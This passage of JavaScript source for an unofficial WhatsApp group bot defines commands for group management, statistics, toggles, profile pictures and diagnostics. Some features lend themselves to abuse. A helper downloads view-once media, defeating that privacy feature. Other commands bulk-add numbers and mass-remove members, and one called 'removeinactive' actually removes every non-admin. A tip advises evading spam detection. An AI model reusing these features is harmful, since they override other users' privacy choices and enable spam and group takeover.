  if (!args[0] || !args[0].includes('chat.whatsapp.com')) return style.reply(sock, sender, style.error('Usage: .join <invite link>'), msg);
  await style.react(sock, sender, msg, '🚪');
  try { await sock.groupAcceptInvite(args[0].split('chat.whatsapp.com/')[1].split('?')[0]); await style.reply(sock, sender, style.success('Joined.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.leave = { desc: '🌌 Leave', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '🏃');
  await sock.sendMessage(sender, { text: '╭━『 ☠️ GOODBYE 』━╮\n> Disconnecting...\n╰━━━━━━━ ☉' });
  await delay(1500);
  await sock.groupLeave(sender);
}};

builtInCommands.close = { desc: '🔒 Lock', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '🔒');
  await sock.groupSettingUpdate(sender, 'announcement');
  await sock.sendMessage(sender, { text: style.success('Locked.') }, { quoted: msg });
}};

builtInCommands.open = { desc: '🔓 Open', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '🔓');
  await sock.groupSettingUpdate(sender, 'not_announcement');
  await style.reply(sock, sender, style.success('Opened.'), msg);
}};

builtInCommands.grouplink = { desc: '🔗 Invite link', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '🔗');
  try { const meta = await sock.groupMetadata(sender); const code = await sock.groupInviteCode(sender); let pp; try { pp = await sock.profilePictureUrl(sender, 'image'); } catch { pp = 'https://i.imgur.com/2m7wW4Q.png'; } await sock.sendMessage(sender, { image: { url: pp }, caption: `╭━『 ${meta.subject} 』━╮\n${style.kv('Members', meta.participants.length)}\n${style.kv('Created', new Date(meta.creation * 1000).toLocaleDateString())}\n╰━━━━━━━ ☉\n\n🔗 https://chat.whatsapp.com/${code}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Need admin.'), msg); }
}};

builtInCommands.revoke = { desc: '🔄 Reset invite', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '🔄');
  await sock.groupRevokeInviteCode(sender);
  await style.reply(sock, sender, style.success('Reset.'), msg);
}};

builtInCommands.setname = { desc: '📝 Rename', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us') || !args.length) return style.reply(sock, sender, style.error('Usage: .setname <name>'), msg);
  await style.react(sock, sender, msg, '📝');
  await sock.groupUpdateSubject(sender, args.join(' '));
  await style.reply(sock, sender, style.success('Updated.'), msg);
}};

builtInCommands.setdesc = { desc: '✍️ Set desc', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us') || !args.length) return style.reply(sock, sender, style.error('Usage: .setdesc <text>'), msg);
  await style.react(sock, sender, msg, '✍️');
  await sock.groupUpdateDescription(sender, args.join(' '));
  await style.reply(sock, sender, style.success('Updated.'), msg);
}};

builtInCommands.gci = builtInCommands.groupinfo = { desc: '📊 Group info', execute: async (sock, sender, args, msg) => {
  const jid = msg.key.remoteJid;
  if (!jid.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  const meta = await sock.groupMetadata(jid);
  const admins = meta.participants.filter(p => p.admin).length;
  await sock.sendMessage(jid, { text: `╭━『 📊 GROUP INFO 』━╮\n${style.kv('Name', meta.subject)}\n${style.kv('ID', jid)}\n${style.kv('Owner', meta.owner ? '@' + meta.owner.split('@')[0] : 'Unknown')}\n${style.kv('Created', new Date(meta.creation * 1000).toLocaleDateString())}\n${style.kv('Total', meta.participants.length)}\n${style.kv('Admins', admins)}\n╰━━━━━━━ ☉`, mentions: meta.owner ? [meta.owner] : [], contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.prctme = builtInCommands.protectme = builtInCommands.safety = { desc: '🛡️ Safety', execute: async (sock, sender, args, msg) => {
  const jid = msg.key.remoteJid, now = Date.now();
  if (!userSpamData.has(sender)) userSpamData.set(sender, { count: 0, last: now });
  let d = userSpamData.get(sender);
  if (now - d.last > 60000) { d.count = 0; d.last = now; }
  const warn = d.count > 15;
  await sock.sendMessage(jid, { text: `╭━『 🛡️ SAFETY 』━╮\n${style.kv('Status', warn ? '⚠️ DANGER' : '✅ SAFE')}\n${style.kv('Commands/60s', `${d.count}/15`)}\n╰━━━━━━━ ☉\n\n${style.tip('Slow down to avoid spam detection.')}`, mentions: jid.endsWith('@g.us') ? [sender] : [], contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  d.count++;
}};

/* ── EXTENDED GROUP COMMANDS ── */
builtInCommands.setgpp = { desc: '🖼️ Set group PFP', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.imageMessage && !q?.imageMessage) return style.reply(sock, sender, style.error('Reply to image.'), msg);
  await style.react(sock, sender, msg, '🖼️');
  try { const b = await downloadMsg(sock, msg); await sock.updateProfilePicture(sender, b); await style.reply(sock, sender, style.success('Group PFP updated.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed (need admin).'), msg); }
}};

builtInCommands.invite = { desc: '📨 Fresh invite', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '📨');
  try { const c = await sock.groupInviteCode(sender); await style.reply(sock, sender, style.box('INVITE', `https://chat.whatsapp.com/${c}`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Need admin.'), msg); }
}};

builtInCommands.members = { desc: '📋 List members', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '📋');
  const meta = await sock.groupMetadata(sender);
  const list = meta.participants.map((p, i) => `${i + 1}. ${p.admin ? '👑' : '👤'} @${p.id.split('@')[0]}`).join('\n');
  await sock.sendMessage(sender, { text: `╭━『 📋 MEMBERS (${meta.participants.length}) 』━╮\n${list}\n╰━━━━━━━ ☉`, mentions: meta.participants.map(p => p.id), contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.adminlist = { desc: '👑 Admin list', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '👑');
  const meta = await sock.groupMetadata(sender);
  const admins = meta.participants.filter(p => p.admin);
  const list = admins.map((p, i) => `${i + 1}. @${p.id.split('@')[0]}`).join('\n');
  await sock.sendMessage(sender, { text: `╭━『 👑 ADMINS (${admins.length}) 』━╮\n${list}\n╰━━━━━━━ ☉`, mentions: admins.map(p => p.id), contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.onlyadmins = { desc: '🔒 Only admins', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '🔒');
  try { await sock.groupSettingUpdate(sender, 'announcement'); await style.reply(sock, sender, style.success('Only admins can send.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.unlockgroup = { desc: '🔓 Unlock group', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '🔓');
  try { await sock.groupSettingUpdate(sender, 'not_announcement'); await style.reply(sock, sender, style.success('All members can send.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.lockgroup = { desc: '🔒 Lock group', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '🔒');
  try { await sock.groupSettingUpdate(sender, 'announcement'); await style.reply(sock, sender, style.success('Locked.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.groupstats = { desc: '📊 Group stats', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '📊');
  const m = await sock.groupMetadata(sender);
  const admins = m.participants.filter(p => p.admin).length;
  const superadmins = m.participants.filter(p => p.admin === 'superadmin').length;
  const age = Math.floor((Date.now() - m.creation * 1000) / 86400000);
  await style.reply(sock, sender, style.box('📊 GROUP STATS', [style.kv('Subject', m.subject), style.kv('Members', m.participants.length), style.kv('Admins', admins), style.kv('Superadmins', superadmins), style.kv('Age (days)', age), style.kv('Restrict', m.restrict ? 'ON' : 'OFF'), style.kv('Announce', m.announce ? 'ON' : 'OFF')].join('\n')), msg);
}};

builtInCommands.statsgroup = builtInCommands.statstoday = {
  desc: '📊 Group message stats today',
  execute: async (sock, sender, args, msg) => {
    if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
    await style.react(sock, sender, msg, '📊');
    const s = getGroupStats(sender);
    if (!s) return style.reply(sock, sender, style.box('GROUP STATS', 'No activity tracked yet today.'), msg);
    const top = rankUsers(s.users, 5).map(([u, c], i) => `${i + 1}. @${u.split('@')[0]} — *${c}* msgs`).join('\n');
    await sock.sendMessage(sender, {
      text: style.box('📊 TODAY STATS', `${style.kv('Total Messages', s.total)}\n${style.kv('Active Users', Object.keys(s.users).length)}\n\n*🏆 TOP ACTIVE USERS:*\n${top || 'None'}`),
      mentions: rankUsers(s.users, 5).map(([u]) => u),
      contextInfo: CHANNEL_CONTEXT
    }, { quoted: msg });
  }
};

builtInCommands.statsweek = {
  desc: '📊 Group message stats this week',
  execute: async (sock, sender, args, msg) => {
    if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
    await style.react(sock, sender, msg, '📊');
    const w = getWeeklyGroupStats(sender);
    if (!w) return style.reply(sock, sender, style.box('WEEKLY STATS', 'No weekly data tracked yet.'), msg);
    const top = rankUsers(w.users, 7).map(([u, c], i) => `${i + 1}. @${u.split('@')[0]} — *${c}* msgs`).join('\n');
    await sock.sendMessage(sender, {
      text: style.box('📈 WEEKLY STATS', `${style.kv('7-Day Total', w.total)}\n\n*🏆 TOP CHATTERS:*\n${top || 'None'}`),
      mentions: rankUsers(w.users, 7).map(([u]) => u),
      contextInfo: CHANNEL_CONTEXT
    }, { quoted: msg });
  }
};

builtInCommands.removeinactive = { desc: '🧹 Remove inactive', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '🧹');
  try { const meta = await sock.groupMetadata(sender); const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net'; const targets = meta.participants.filter(p => !p.admin && p.id !== botJid).map(p => p.id); let n = 0; for (const t of targets) { try { await sock.groupParticipantsUpdate(sender, [t], 'remove'); n++; await delay(400); } catch(e) {} } await style.reply(sock, sender, style.success(`Removed ${n}.`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.addall = { desc: '➕ Bulk add', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .addall 2637xxx,2637yyy'), msg);
  await style.react(sock, sender, msg, '➕');
  const nums = args.join(' ').split(/[,\s]+/).filter(Boolean).map(n => n.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
  let added = 0, failed = 0;
  for (const n of nums) { try { const r = await sock.groupParticipantsUpdate(sender, [n], 'add'); if (r?.[0]?.status === '200') added++; else failed++; await delay(500); } catch(e) { failed++; } }
  await style.reply(sock, sender, style.box('BULK ADD', `Added: ${added}\nFailed: ${failed}`), msg);
}};

builtInCommands.masskick = { desc: '🧨 Mass kick', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  const mentions = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  if (!mentions.length) return style.reply(sock, sender, style.error('Mention users.'), msg);
  await style.react(sock, sender, msg, '🧨');
  let n = 0; for (const u of mentions) { try { await sock.groupParticipantsUpdate(sender, [u], 'remove'); n++; await delay(400); } catch(e) {} }
  await style.reply(sock, sender, style.success(`Removed ${n}/${mentions.length}.`), msg);
}};

builtInCommands.welcome = { desc: '👋 Toggle welcome', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '👋');
  const rt = getRuntime(sock);
  if (args[0] === 'on') { rt.settings.welcome = true; saveRuntime(sock); return style.reply(sock, sender, style.success('Welcome ON'), msg); }
  if (args[0] === 'off') { rt.settings.welcome = false; saveRuntime(sock); return style.reply(sock, sender, style.success('Welcome OFF'), msg); }
  await style.reply(sock, sender, style.error('Usage: .welcome on|off'), msg);
}};

builtInCommands.goodbye = { desc: '👋 Toggle goodbye', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '👋');
  const rt = getRuntime(sock);
  if (args[0] === 'on') { rt.settings.goodbye = true; saveRuntime(sock); return style.reply(sock, sender, style.success('Goodbye ON'), msg); }
  if (args[0] === 'off') { rt.settings.goodbye = false; saveRuntime(sock); return style.reply(sock, sender, style.success('Goodbye OFF'), msg); }
  await style.reply(sock, sender, style.error('Usage: .goodbye on|off'), msg);
}};

builtInCommands.poll2 = { desc: '📊 Advanced poll', execute: async (sock, sender, args, msg) => {
  const full = args.join(' ');
  const [q, ...opts] = full.split('|').map(s => s.trim());
  if (!q || opts.length < 2) return style.reply(sock, sender, style.error('Usage: .poll2 Q | opt1 | opt2 ...'), msg);
  await style.react(sock, sender, msg, '📊');
  try { await sock.sendMessage(sender, { poll: { name: q, values: opts, selectableCount: 1 } }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};
builtInCommands.poll = builtInCommands.poll2;

async function postGroupStatus(sock, groupJid, innerContent) {
  try {
    const waMsg = await generateWAMessageFromContent(groupJid, { groupStatusMessageV2: { message: innerContent } }, { userJid: sock.user.id });
    await sock.relayMessage(groupJid, waMsg.message, { messageId: waMsg.key.id });
    return { ok: true, method: 'relay_groupStatusMessageV2' };
  } catch(e) {}
  try {
    const meta = await sock.groupMetadata(groupJid).catch(() => null);
    const participants = meta?.participants?.map(p => p.id) || [];
    const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
    const statusJidList = [...new Set([groupJid, botJid, ...participants])];
    await sock.sendMessage(groupJid, { groupStatusMessage: innerContent }, { statusJidList });
    return { ok: true, method: 'groupStatusMessage' };
  } catch(e) {}
  return { ok: false, error: 'All group status methods failed' };
}

builtInCommands.gcstatus = { desc: '📸 Post to GROUP status', execute: async (sock, sender, args, msg) => {
  const jid = msg.key.remoteJid;
  if (!jid.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '📸');
  const ctx = msg.message?.extendedTextMessage?.contextInfo;
  const q = ctx?.quotedMessage;
  const text = (args.join(' ') || msg.message?.imageMessage?.caption || msg.message?.videoMessage?.caption || q?.imageMessage?.caption || q?.videoMessage?.caption || '').trim();
  const hasImage = !!(msg.message?.imageMessage || q?.imageMessage);
  const hasVideo = !!(msg.message?.videoMessage || q?.videoMessage);
  if (!text && !hasImage && !hasVideo) return style.reply(sock, sender, style.error('Provide text or reply to an image/video.'), msg);
  let innerContent;
  if (hasImage || hasVideo) {
    const buf = await downloadMsg(sock, msg);
    if (!buf) return style.reply(sock, sender, style.error('Media download failed.'), msg);
    if (hasVideo) innerContent = { video: buf, caption: text || '', mimetype: (q?.videoMessage || msg.message?.videoMessage)?.mimetype || 'video/mp4' };
    else innerContent = { image: buf, caption: text || '' };
  } else {
    innerContent = { text: text || '📢', backgroundColor: '#0F0F0F', font: 3 };
  }
  const result = await postGroupStatus(sock, jid, innerContent);
  if (result.ok) await style.reply(sock, sender, style.success(`Group status posted (${result.method}).`), msg);
  else await style.reply(sock, sender, style.error('Group status failed: ' + result.error), msg);
}};


/* ── TOGGLES ── */
const mkToggle = (key, label) => ({ desc: `${label} toggle`, execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '⚙️');
  const rt = getRuntime(sock);
  if (args[0] === 'on') { rt.settings[key] = true; saveRuntime(sock); return style.reply(sock, sender, style.success(`${label} ON`), msg); }
  if (args[0] === 'off') { rt.settings[key] = false; saveRuntime(sock); return style.reply(sock, sender, style.success(`${label} OFF`), msg); }
  await style.reply(sock, sender, style.error(`Usage: .${label.toLowerCase()} on|off`), msg);
}});
builtInCommands.antilink = mkToggle('antilink', 'Antilink');
builtInCommands.antibot = mkToggle('antibot', 'Antibot');
builtInCommands.antidelete = mkToggle('antidelete', 'Anti-Delete');
builtInCommands.anticall = mkToggle('anticall', 'Anti-Call');
builtInCommands.antileave = mkToggle('antileave', 'Anti-Leave');
builtInCommands.antibadword = mkToggle('antibadword', 'Anti-Badword');
builtInCommands.antiimage = mkToggle('antiimage', 'Anti-Image');
builtInCommands.antistatusmention = mkToggle('antistatusmention', 'Anti-Status-Mention');
builtInCommands.antispam = mkToggle('antispam', 'Anti-Spam');
builtInCommands.antiviewonce = mkToggle('antiviewonce', 'Anti-ViewOnce');
builtInCommands.antipromote = mkToggle('antipromote', 'Anti-Promote');
builtInCommands.antidemote = mkToggle('antidemote', 'Anti-Demote');
builtInCommands.antiraid = mkToggle('antiraid', 'Anti-Raid');
builtInCommands.autotyping = mkToggle('autotyping', 'Auto-Typing');
builtInCommands.autoreact = mkToggle('autoReact', 'Auto-React');
builtInCommands.autostatusview = mkToggle('autoStatusView', 'Auto-Status-View');
builtInCommands.aidm = mkToggle('aiDm', 'AI-DM');

builtInCommands.autoreply = { desc: '💬 Auto-reply', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '💬');
  const rt = getRuntime(sock);
  if (args[0] === 'on') { rt.settings.autoReply = true; if (args[1]) rt.settings.autoReplyText = args.slice(1).join(' '); saveRuntime(sock); return style.reply(sock, sender, style.success('Auto-reply ON.'), msg); }
  if (args[0] === 'off') { rt.settings.autoReply = false; saveRuntime(sock); return style.reply(sock, sender, style.success('Auto-reply OFF.'), msg); }
  await style.reply(sock, sender, style.error('Usage: .autoreply on|off [msg]'), msg);
}};

/* ── OWNER ── */
builtInCommands.owner = builtInCommands.developer = { desc: '👑 Owner contact', execute: async (sock, sender, args, msg) => {
  if (!OWNER_NUMBER) return style.reply(sock, sender, style.error('Owner number not configured.'), msg);
  await style.react(sock, sender, msg, '👑');
  await sock.sendMessage(sender, { contacts: { displayName: OWNER_NAME, contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${OWNER_NAME}\nTEL;type=CELL;type=VOICE;waid=${OWNER_NUMBER}:${OWNER_NUMBER}\nEND:VCARD` }] } }, { quoted: msg });
  await style.reply(sock, sender, style.box('👑 OWNER', `${style.kv('Name', OWNER_NAME)}\n${style.kv('Number', '+' + OWNER_NUMBER)}`), msg);
}};

builtInCommands.fullpp = builtInCommands.setpp = { desc: '🖼️ Set PFP', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!q?.imageMessage) return style.reply(sock, sender, style.error('Reply to image.'), msg);
  await style.react(sock, sender, msg, '🖼️');
  try { const b = await downloadMsg(sock, msg); await sock.updateProfilePicture(sock.user.id, b); await style.reply(sock, sender, style.success('Updated.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.delpp = { desc: '🗑️ Remove PFP', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🗑️');
  try { const jid = sock.user.id.split(':')[0] + '@s.whatsapp.net'; if (typeof sock.removeProfilePicture === 'function') await sock.removeProfilePicture(jid); else await sock.updateProfilePicture(jid, { url: null }); await style.reply(sock, sender, style.success('Removed.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.getpp = { desc: '🖼️ Get PFP', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🖼️');
  let target = sender;
  if (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length) target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
  else if (args[0]) target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  try { const url = await sock.profilePictureUrl(target, 'image').catch(() => null); if (!url) return style.reply(sock, sender, style.error('No PFP.'), msg); await sock.sendMessage(sender, { image: { url }, caption: `🖼️ @${target.split('@')[0]}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg, mentions: [target] }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.block = { desc: '🚫 Block', execute: async (sock, sender, args, msg) => {
  const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || msg.message?.extendedTextMessage?.contextInfo?.participant;
  if (!u) return style.reply(sock, sender, style.error('Mention user.'), msg);
  await style.react(sock, sender, msg, '🚫');
  try { BLACKLIST.add(u); await sock.updateBlockStatus(u, 'block'); await style.reply(sock, sender, style.success(`@${u.split('@')[0]} blocked.`), msg, { mentions: [u] }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.unblock = { desc: '✅ Unblock', execute: async (sock, sender, args, msg) => {
  const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (!u) return style.reply(sock, sender, style.error('Mention user.'), msg);
  BLACKLIST.delete(u); await sock.updateBlockStatus(u, 'unblock');
  await style.reply(sock, sender, style.success('Unblocked.'), msg, { mentions: [u] });
}};

/* ── DIAGNOSTICS ── */
builtInCommands.alive = { desc: '🤖 Bot status', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '𓆣');
  const up = Math.floor((Date.now() - startTime) / 1000);
  const total = Object.keys(builtInCommands).length + Object.keys(plugins).length;
  const used = os.totalmem() - os.freemem(), pct = used / os.totalmem();
  const ramBar = '█'.repeat(Math.round(pct * 10)) + '░'.repeat(10 - Math.round(pct * 10));
  const text = `╭━『 𓆣 STATUS 』━╮\n${style.kv('Bot', BOT_NAME.toUpperCase())}\n${style.kv('Owner', OWNER_NAME)}\n${style.kv('Version', VERSION)}\n${style.kv('Uptime', runtime(up))}\n${style.kv('Commands', total)}\n${style.kv('RAM', `${ramBar} ${(used / 1024 / 1024).toFixed(0)}MB`)}\n${style.kv('Brain', '🧠 ONLINE')}\n╰━━━━━━━ ☉`;
  const pp = await sock.profilePictureUrl(sender, 'image').catch(() => null);
  const img = pp || (fs.existsSync(MENU_IMAGE) ? MENU_IMAGE : null);
  if (img) await sock.sendMessage(sender, { image: { url: img }, caption: text, mentions: [sender], contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  else await sock.sendMessage(sender, { text, mentions: [sender], contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.ping = builtInCommands.speed = builtInCommands.stats = builtInCommands.uptime = { desc: '📡 Ping', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '📡');
  const t0 = Date.now();
  let m = await sock.sendMessage(sender, { text: '🌌 INIT...' }, { quoted: msg });
  const latency = Date.now() - t0;
  const isFast = latency < 200;
  const bg = isFast ? '#0066FF' : '#000000';
  const cap = `╭━『 📡 DIAGNOSTIC 』━╮\n${style.kv('Ping', latency + ' ms')}\n${style.kv('Status', isFast ? '🔵 SUPER FAST' : latency < 500 ? '🟡 STABLE' : '🔴 SLOW')}\n${style.kv('RAM', `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`)}\n${style.kv('Node', process.version)}\n${style.kv('Uptime', `${Math.floor(process.uptime() / 60)}m ${Math.floor(process.uptime() % 60)}s`)}\n╰━━━━━━━ ☉`;
  try {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="800" height="400"><rect width="100%" height="100%" fill="${bg}"/><text x="50%" y="40%" font-family="Arial Black" font-size="110" fill="#FFF" text-anchor="middle" dominant-baseline="middle">PONG!</text><text x="50%" y="65%" font-family="Arial" font-size="36" fill="#FFF" text-anchor="middle" dominant-baseline="middle">${latency} ms</text></svg>`;
    const png = await sharp(Buffer.from(svg)).png().toBuffer();
    try { await sock.sendMessage(sender, { delete: m.key }); } catch(e) {}
    await sock.sendMessage(sender, { image: png, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  } catch(e) { await style.reply(sock, sender, cap, msg); }
}};

builtInCommands.repo = builtInCommands.script = builtInCommands.source = { desc: '📦 Source', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '📦');
  await sock.sendMessage(sender, { text: `╭━『 SOURCE 』━╮\n${style.kv('Bot', BOT_NAME)}\n${style.kv('Version', VERSION)}\n${style.kv('Runtime', 'Node ' + process.version)}\n${style.kv('RAM', (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + ' MB')}\n${style.kv('Uptime', (process.uptime() / 3600).toFixed(1) + ' h')}\n╰━━━━━━━ ☉\n${style.kv('Developer', OWNER_NAME)}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.getowner = { desc: '📞 Owner', execute: async (sock, sender, args, msg) => {
  if (!OWNER_NUMBER) return style.reply(sock, sender, style.error('Owner number not configured.'), msg);
  await sock.sendMessage(sender, { contacts: { displayName: OWNER_NAME, contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${OWNER_NAME};;;\nFN:${OWNER_NAME}\nitem1.TEL;waid=${OWNER_NUMBER}:+${OWNER_NUMBER}\nitem1.X-ABLabel:Mobile\nEND:VCARD` }] } }, { quoted: msg });
  await style.reply(sock, sender, `📞 \`\`+${OWNER_NUMBER}\`\``, msg);
}};

builtInCommands.lastseen = { desc: '⏱️ Last seen', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '⏱️');
  const target = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || msg.message?.extendedTextMessage?.contextInfo?.participant;
  if (target) { try { const r = await sock.fetchStatus(target); const setAt = r?.setAt ? new Date(r.setAt).toLocaleString() : '?'; return style.reply(sock, sender, style.box('STATUS', `${style.kv('User', '@' + target.split('@')[0])}\n${style.kv('Status', r?.status || 'None')}\n${style.kv('Set', setAt)}`), msg, { mentions: [target] }); } catch(e) { return style.reply(sock, sender, style.error('Cannot fetch (privacy).'), msg); } }
  const up = Math.floor((Date.now() - startTime) / 1000);
  await style.reply(sock, sender, style.box('UPTIME', `${runtime(up)}\n${style.tip('Mention user for last seen.')}`), msg);
}};

builtInCommands.debugchat = { desc: '🛠️ Debug', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🛠️');
  await style.reply(sock, sender, style.box('CHAT DEBUG', [style.kv('Chat JID', sender), style.kv('Participant', msg.key.participant || 'DM'), style.kv('Msg ID', msg.key.id), style.kv('From Me', msg.key.fromMe)].join('\n')), msg);
}};

builtInCommands.crashbots = { desc: '🤖 Crashbots', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '🤖'); await style.reply(sock, sender, style.box('CRASHBOTS', 'Online • Multi-threaded • Ready.'), msg); } };
builtInCommands.crash = { desc: '⚠️ Crash', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '⚠️'); await style.reply(sock, sender, style.success('Terminating...'), msg); setTimeout(() => process.exit(1), 1000); } };
builtInCommands.restart = { desc: '🔄 Restart', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🔄');
  await style.reply(sock, sender, style.success('Restarting...'), msg);
  setTimeout(() => { const c = require('child_process').spawn(process.argv[0], process.argv.slice(1), { detached: true, stdio: 'inherit' }); c.unref(); process.exit(0); }, 1000);
}};

/* ── MEDIA ── */
async function getViewOnceContent(sock, msg) {
  const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  const targetMsg = quoted ? {
    key: { remoteJid: msg.key.remoteJid, id: msg.message.extendedTextMessage.contextInfo.stanzaId, participant: msg.message.extendedTextMessage.contextInfo.participant || msg.key.participant, fromMe: false },
    message: quoted
  } : msg;
  const inner = unwrapViewOnce(targetMsg.message);
  if (!inner) return { ok: false, reason: 'not_viewonce' };
  const t = getContentType(inner);
  if (!t) return { ok: false, reason: 'unsupported' };
  const content = inner[t];
  if (!content) return { ok: false, reason: 'empty' };
  try {
    const stream = await downloadContentFromMessage(content, t.replace('Message', ''));
    let buf = Buffer.from([]);
    for await (const c of stream) buf = Buffer.concat([buf, c]);
    if (!buf.length) return { ok: false, reason: 'empty_buffer' };
    return { ok: true, type: t, content, buffer: buf };
  } catch (e) { return { ok: false, reason: 'download_failed: ' + e.message }; }
}

function buildMediaFromVO(vo, quoted) {
  const opts = { quoted, contextInfo: CHANNEL_CONTEXT };
  if (vo.type === 'imageMessage') { opts.image = vo.buffer; opts.caption = vo.content.caption || ''; }
  else if (vo.type === 'videoMessage') { opts.video = vo.buffer; opts.mimetype = vo.content.mimetype || 'video/mp4'; opts.caption = vo.content.caption || ''; }
  else if (vo.type === 'audioMessage') { opts.audio = vo.buffer; opts.mimetype = vo.content.mimetype || 'audio/ogg; codecs=opus'; opts.ptt = vo.content.ptt || false; }
  return opts;
}

